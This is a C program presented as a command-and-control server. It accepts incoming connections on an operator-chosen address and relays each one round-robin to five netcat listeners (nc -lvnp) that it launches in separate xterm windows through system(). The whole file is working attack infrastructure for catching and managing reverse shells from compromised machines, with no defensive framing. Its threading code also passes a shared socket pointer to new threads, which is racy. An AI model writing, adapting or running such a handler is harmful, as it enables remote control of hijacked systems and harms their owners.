#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <fcntl.h>
#include <sys/select.h>

#define MAX_CLIENTS 50
#define NUM_TERMINALS 5

char C2_IP[16];
int C2_PORT;
int forward_ports[NUM_TERMINALS] = {2000, 2001, 2002, 2003, 2004};
int active_listeners[NUM_TERMINALS] = {0};

void *handle_client(void *client_socket);
int forward_connection(int target_port, int client_socket);
void setup_xterm_listeners();

int main() {
    int server_fd, client_socket;
    struct sockaddr_in server_addr, client_addr;
    socklen_t addr_size = sizeof(client_addr);

    printf("Enter the C2 host: ");
    scanf("%15s", C2_IP);
    printf("Enter the C2 port: ");
    scanf("%d", &C2_PORT);

    setup_xterm_listeners();

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        perror("[-] Socket error");
        exit(1);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = inet_addr(C2_IP);
    server_addr.sin_port = htons(C2_PORT);

    if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("[-] Bind error");
        close(server_fd);
        exit(1);
    }

    if (listen(server_fd, MAX_CLIENTS) < 0) {
        perror("[-] Listen error");
        close(server_fd);
        exit(1);
    }
    printf("[+] C2 server listening on %s:%d...\n", C2_IP, C2_PORT);

    while (1) {
        client_socket = accept(server_fd, (struct sockaddr *)&client_addr, &addr_size);
        if (client_socket < 0) {
            perror("[-] Accept error");
            continue;
        }
        printf("[+] Client connected from %s\n", inet_ntoa(client_addr.sin_addr));

        pthread_t thread;
        pthread_create(&thread, NULL, handle_client, (void *)&client_socket);
        pthread_detach(thread);
    }

    close(server_fd);
    return 0;
}

void *handle_client(void *client_socket) {
    int socket = *(int *)client_socket;
    static int port_index = 0;
    int target_port = forward_ports[port_index];
    port_index = (port_index + 1) % NUM_TERMINALS;

    forward_connection(target_port, socket);
    close(socket);
    return NULL;
}

int forward_connection(int target_port, int client_socket) {
    int forward_socket;
    struct sockaddr_in forward_addr;
    fd_set fds;
    char buffer[1024];
    int max_fd, n;

    forward_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (forward_socket < 0) {
        perror("[-] Forward socket error");
        return -1;
    }

    forward_addr.sin_family = AF_INET;
    forward_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    forward_addr.sin_port = htons(target_port);

    if (connect(forward_socket, (struct sockaddr *)&forward_addr, sizeof(forward_addr)) < 0) {
        perror("[-] Connection to Netcat listener failed");
        close(forward_socket);
        return -1;
    }
    printf("[+] Forwarding data to port %d\n", target_port);

    fcntl(client_socket, F_SETFL, O_NONBLOCK);
    fcntl(forward_socket, F_SETFL, O_NONBLOCK);

    while (1) {
        FD_ZERO(&fds);
        FD_SET(client_socket, &fds);
        FD_SET(forward_socket, &fds);
        max_fd = (client_socket > forward_socket) ? client_socket : forward_socket;

        if (select(max_fd + 1, &fds, NULL, NULL, NULL) < 0) {
            perror("[-] Select error");
            break;
        }

        if (FD_ISSET(client_socket, &fds)) {
            n = recv(client_socket, buffer, sizeof(buffer), 0);
            if (n <= 0) break;
            send(forward_socket, buffer, n, 0);
        }

        if (FD_ISSET(forward_socket, &fds)) {
            n = recv(forward_socket, buffer, sizeof(buffer), 0);
            if (n <= 0) break;
            send(client_socket, buffer, n, 0);
        }
    }

    close(forward_socket);
    return 0;
}

void setup_xterm_listeners() {
    char command[512];
    char *font = "DejaVu Sans Mono Bold";
    int font_size = 10;
    char *spacing = "0.3";
    char *geometry = "50x20";
    int x_positions[] = {0, 370, 740, 1110, 1480};
    int y_position = 700;

    for (int i = 0; i < NUM_TERMINALS; i++) {
        snprintf(command, sizeof(command), "xterm -fa '%s' -fs %d \
                -xrm 'XTerm*faceSpacing: %s' \
                -xrm 'XTerm*faceAntialias: true' \
                -xrm 'XTerm*VT100.translations: #override Ctrl Shift <Key>C: copy-selection(CLIPBOARD) \\n Ctrl Shift <Key>V: insert-selection(CLIPBOARD)' \
                -geometry '%s+%d+%d' -T 'Listener_%d' -e nc -lvnp %d &",
                font, font_size, spacing, geometry, x_positions[i], y_position, i + 1, forward_ports[i]);
        system(command);
        usleep(100000);
    }
    sleep(1);
}

